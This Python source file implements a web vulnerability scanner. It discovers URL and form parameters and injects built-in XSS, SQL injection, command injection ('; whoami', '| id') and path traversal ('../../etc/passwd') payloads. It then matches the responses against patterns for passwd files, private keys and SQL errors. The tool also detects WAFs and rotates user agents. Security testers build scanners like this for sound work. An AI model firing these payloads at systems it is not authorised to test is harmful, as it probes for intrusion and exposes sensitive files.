import httpx
from bs4 import BeautifulSoup
import re
import logging
import random
import asyncio
import time
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from typing import Dict, List, Optional
from dataclasses import dataclass
from collections import defaultdict

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

@dataclass
class VulnerabilityResult:
    url: str
    param: str
    payload: str
    vuln_type: str
    confidence: str
    evidence: str
    response_time: float
    status_code: int

class WAFDetector:
    WAF_PATTERNS = [
        r"cloudflare|cf-ray", r"incapsula|imperva", r"akamai|ghost",
        r"barracuda|bwaf", r"f5-bigip|bigip", r"aws-waf|x-amzn",
        r"sucuri|x-sucuri", r"mod_security|modsecurity"
    ]

    BLOCK_PATTERNS = [
        r"access.denied|forbidden|blocked", r"security.violation|firewall",
        r"suspicious.activity|malicious", r"rate.limit|too.many.requests"
    ]

    @staticmethod
    def detect_waf(response: httpx.Response) -> Optional[str]:
        headers_str = " ".join([f"{k}: {v}" for k, v in response.headers.items()]).lower()
        content = response.text.lower()
        for pattern in WAFDetector.WAF_PATTERNS:
            if re.search(pattern, headers_str) or re.search(pattern, content):
                return pattern
        return None

    @staticmethod
    def is_blocked(response: httpx.Response) -> bool:
        if response.status_code in [403, 406, 429, 503]:
            return True
        content = response.text.lower()
        for pattern in WAFDetector.BLOCK_PATTERNS:
            if re.search(pattern, content):
                return True
        return False

class ParameterDiscovery:
    @staticmethod
    async def discover_parameters(client: httpx.AsyncClient, url: str) -> List[str]:
        """Discover existing parameters from URL and forms"""
        discovered_params = set()
        
        # Parse existing URL parameters
        parsed = urlparse(url)
        if parsed.query:
            existing_params = parse_qs(parsed.query)
            discovered_params.update(existing_params.keys())
                
        # Form analysis
        try:
            response = await client.get(url, timeout=10)
            if response.status_code == 200:
                soup = BeautifulSoup(response.text, "html.parser")
                forms = soup.find_all("form")
                for form in forms:
                    inputs = form.find_all(["input", "select", "textarea"])
                    for inp in inputs:
                        name = inp.get("name")
                        if name:
                            discovered_params.add(name)
        except Exception:
            pass
            
        return list(discovered_params)

    @staticmethod
    def inject_param(url: str, param: str, value: str) -> str:
        parsed = urlparse(url)
        query = parse_qs(parsed.query)
        query[param] = [value]
        new_query = urlencode(query, doseq=True)
        return urlunparse((parsed.scheme, parsed.netloc, parsed.path, 
                        parsed.params, new_query, parsed.fragment))

class VulnerabilityDetectors:
    @staticmethod
    def detect_xss(payload: str, response: httpx.Response, baseline_response: httpx.Response) -> Optional[VulnerabilityResult]:
        soup = BeautifulSoup(response.text, "html.parser")
        
        confidence = "LOW"
        evidence = ""
        
        # High confidence indicators
        if f"<script>alert(" in response.text or f"javascript:alert(" in response.text:
            confidence = "HIGH"
            evidence = "JavaScript execution context detected"
        elif payload in response.text:
            # Check if payload is in script tag
            for script in soup.find_all("script"):
                if payload in script.get_text():
                    confidence = "HIGH"
                    evidence = "Payload found in script tag"
                    break
            else:
                # Check event attributes
                for tag in soup.find_all():
                    for attr, value in tag.attrs.items():
                        if attr.startswith("on") and payload in str(value):
                            confidence = "HIGH"
                            evidence = f"Payload found in {attr} attribute"
                            break
                else:
                    confidence = "MEDIUM"
                    evidence = "Payload reflected in HTML context"
        
        if confidence != "LOW":
            return VulnerabilityResult(
                url=str(response.url), param="", payload=payload,
                vuln_type="XSS", confidence=confidence, evidence=evidence,
                response_time=0, status_code=response.status_code
            )
        return None

    @staticmethod
    def detect_sqli(payload: str, response: httpx.Response, baseline_response: httpx.Response) -> Optional[VulnerabilityResult]:
        content = response.text.lower()
        
        sql_errors = [
            (r"you have an error in your sql syntax", "MySQL syntax error"),
            (r"warning: mysql_", "MySQL function error"),
            (r"valid mysql result", "MySQL result error"),
            (r"postgresql.*error", "PostgreSQL error"),
            (r"warning: pg_", "PostgreSQL function error"),
            (r"microsoft ole db provider", "ODBC error"),
            (r"sqlserver jdbc driver", "SQL Server JDBC error"),
            (r"oracle error", "Oracle error"),
            (r"quoted string not properly terminated", "SQL syntax error"),
            (r"unclosed quotation mark", "SQL syntax error"),
            (r"syntax error.*query", "SQL syntax error")
        ]
        
        for pattern, description in sql_errors:
            if re.search(pattern, content):
                return VulnerabilityResult(
                    url=str(response.url), param="", payload=payload,
                    vuln_type="SQLI", confidence="HIGH",
                    evidence=f"SQL error detected: {description}",
                    response_time=0, status_code=response.status_code
                )
        
        # Check for significant response differences
        if abs(len(response.text) - len(baseline_response.text)) > 1000:
            return VulnerabilityResult(
                url=str(response.url), param="", payload=payload,
                vuln_type="SQLI", confidence="MEDIUM",
                evidence="Significant response difference detected",
                response_time=0, status_code=response.status_code
            )
        return None

    @staticmethod
    def detect_cmdi(payload: str, response: httpx.Response, baseline_response: httpx.Response) -> Optional[VulnerabilityResult]:
        content = response.text
        
        cmd_indicators = [
            (r"uid=\d+.*gid=\d+", "Unix user ID output"),
            (r"root:.*:0:0:", "Unix passwd file"),
            (r"Microsoft Windows \[Version", "Windows version info"),
            (r"Directory of [A-Z]:", "Windows directory listing"),
            (r"Volume.*Serial Number", "Windows volume info"),
            (r"127\.0\.0\.1.*bytes.*time", "Ping command output"),
            (r"PING.*\d+\.\d+\.\d+\.\d+", "Ping command output"),
            (r"bin/sh|/bin/bash|cmd\.exe", "Shell execution")
        ]
        
        for pattern, description in cmd_indicators:
            if re.search(pattern, content):
                return VulnerabilityResult(
                    url=str(response.url), param="", payload=payload,
                    vuln_type="CMDI", confidence="HIGH",
                    evidence=f"Command execution detected: {description}",
                    response_time=0, status_code=response.status_code
                )
        return None

    @staticmethod
    def detect_path_traversal(payload: str, response: httpx.Response, baseline_response: httpx.Response) -> Optional[VulnerabilityResult]:
        content = response.text
        
        file_indicators = [
            (r"root:.*:0:0:.*:/bin/", "Unix passwd file"),
            (r"\[boot loader\].*\[operating systems\]", "Windows boot.ini"),
            (r"\[extensions\].*\[mci extensions\]", "Windows win.ini"),
            (r"<\?xml.*encoding=", "XML file disclosure"),
            (r"#.*Apache.*Configuration", "Apache config file"),
            (r"user_pref\(.*firefox", "Firefox preferences"),
            (r"BEGIN RSA PRIVATE KEY", "Private key disclosure")
        ]
        
        for pattern, description in file_indicators:
            if re.search(pattern, content, re.IGNORECASE):
                return VulnerabilityResult(
                    url=str(response.url), param="", payload=payload,
                    vuln_type="PATH_TRAVERSAL", confidence="HIGH",
                    evidence=f"File disclosure detected: {description}",
                    response_time=0, status_code=response.status_code
                )
        return None

class VulnerabilityScanner:
    def __init__(self):
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36"
        ]
        
        self.payloads = {
            "XSS": [
                '"><script>alert("XSS")</script>',
                '<img src=x onerror=alert("XSS")>',
                '<svg onload=alert("XSS")>',
                "javascript:alert('XSS')",
                '<iframe src="javascript:alert(\'XSS\')">',
                '"><svg/onload=alert("XSS")>',
                '<script>alert(String.fromCharCode(88,83,83))</script>'
            ],
            "SQLI": [
                "' OR '1'='1",
                "' OR 1=1--",
                '" OR "1"="1',
                "' UNION SELECT null--",
                "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
                "' OR SLEEP(5)--",
                "'; WAITFOR DELAY '0:0:5'--"
            ],
            "CMDI": [
                "; whoami",
                "| whoami", 
                "& whoami",
                "; id",
                "| id",
                "& id",
                "; ping -c 1 127.0.0.1",
                "| ping -c 1 127.0.0.1",
                "& ping -c 1 127.0.0.1"
            ],
            "PATH_TRAVERSAL": [
                "../../etc/passwd",
                "../../../etc/passwd",
                "../../../../etc/passwd",
                "../../../../../../etc/passwd",
                "..\\..\\windows\\win.ini",
                "..\\..\\..\\windows\\win.ini",
                "....//....//....//etc/passwd",
                "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
            ]
        }

    def _get_headers(self) -> Dict[str, str]:
        return {
            "User-Agent": random.choice(self.user_agents),
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Accept-Encoding": "gzip, deflate",
            "Connection": "keep-alive"
        }

    def _ensure_http_scheme(self, url: str) -> str:
        if not url.startswith(("http://", "https://")):
            return "http://" + url
        return url

    async def _test_parameter(self, client: httpx.AsyncClient, url: str, param: str, 
                            payload: str, vuln_type: str, semaphore: asyncio.Semaphore) -> Optional[VulnerabilityResult]:
        async with semaphore:
            try:
                await asyncio.sleep(random.uniform(0.1, 0.3))
                
                # Get baseline response
                baseline_url = ParameterDiscovery.inject_param(url, param, "baseline_test")
                baseline_response = await client.get(baseline_url, headers=self._get_headers(), timeout=10)
                
                # Test with payload
                test_url = ParameterDiscovery.inject_param(url, param, payload)
                start_time = time.time()
                test_response = await client.get(test_url, headers=self._get_headers(), timeout=10)
                response_time = time.time() - start_time
                
                # Check for blocking
                if WAFDetector.is_blocked(test_response):
                    return None
                
                # Detect vulnerability
                detector_map = {
                    "XSS": VulnerabilityDetectors.detect_xss,
                    "SQLI": VulnerabilityDetectors.detect_sqli,
                    "CMDI": VulnerabilityDetectors.detect_cmdi,
                    "PATH_TRAVERSAL": VulnerabilityDetectors.detect_path_traversal
                }
                
                detector = detector_map.get(vuln_type)
                if detector:
                    result = detector(payload, test_response, baseline_response)
                    if result:
                        result.param = param
                        result.response_time = response_time
                        result.url = test_url
                        logger.info(f"VULNERABILITY FOUND: {vuln_type} in {param} at {url}")
                        return result
                        
            except Exception as e:
                logger.debug(f"Test failed for {param} with {payload}: {e}")
                
        return None

    async def scan_url(self, url: str) -> List[VulnerabilityResult]:
        url = self._ensure_http_scheme(url)
        results = []
        
        async with httpx.AsyncClient(
            follow_redirects=False, 
            timeout=15.0,
            limits=httpx.Limits(max_keepalive_connections=5, max_connections=10)
        ) as client:
            
            try:
                initial_response = await client.get(url)
                if WAFDetector.is_blocked(initial_response):
                    logger.warning(f"WAF/Blocking detected for {url}")
                    return results
                    
                waf = WAFDetector.detect_waf(initial_response)
                if waf:
                    logger.info(f"WAF detected: {waf} for {url}")
                    
            except Exception as e:
                logger.error(f"Failed to connect to {url}: {e}")
                return results
            
            # Parameter discovery
            logger.info(f"Discovering parameters for {url}")
            parameters = await ParameterDiscovery.discover_parameters(client, url)
            
            if not parameters:
                logger.info(f"No parameters discovered for {url}")
                return results
                
            logger.info(f"Found parameters: {parameters}")
            
            # Vulnerability testing
            semaphore = asyncio.Semaphore(3)
            tasks = []
            
            for param in parameters:
                for vuln_type, payloads in self.payloads.items():
                    for payload in payloads:
                        task = self._test_parameter(client, url, param, payload, vuln_type, semaphore)
                        tasks.append(task)
            
            test_results = await asyncio.gather(*tasks, return_exceptions=True)
            
            for result in test_results:
                if isinstance(result, VulnerabilityResult):
                    results.append(result)
        
        return results

    async def scan_urls(self, urls: List[str]) -> List[VulnerabilityResult]:
        all_results = []
        
        for url in urls:
            logger.info(f"Scanning URL: {url}")
            results = await self.scan_url(url)
            all_results.extend(results)
            await asyncio.sleep(1)  # Respectful delay
            
        return all_results

async def scan_vulnerabilities(urls: List[str]) -> Dict[str, List[Dict]]:
    
    scanner = VulnerabilityScanner()
    results = await scanner.scan_urls(urls)
    
    # Group results by vulnerability type
    grouped_results = defaultdict(list)
    
    for result in results:
        if result.confidence in ["HIGH", "MEDIUM"]:
            vuln_data = {
                "url": result.url,
                "parameter": result.param,
                "payload": result.payload,
                "confidence": result.confidence,
                "evidence": result.evidence,
                "response_time": round(result.response_time, 3),
                "status_code": result.status_code
            }
            grouped_results[result.vuln_type].append(vuln_data)
    
    # Convert defaultdict to regular dict and ensure all vulnerability types are present
    final_results = {
        "XSS": grouped_results.get("XSS", []),
        "SQLI": grouped_results.get("SQLI", []),
        "CMDI": grouped_results.get("CMDI", []),
        "PATH_TRAVERSAL": grouped_results.get("PATH_TRAVERSAL", [])
    }
    
    return final_results
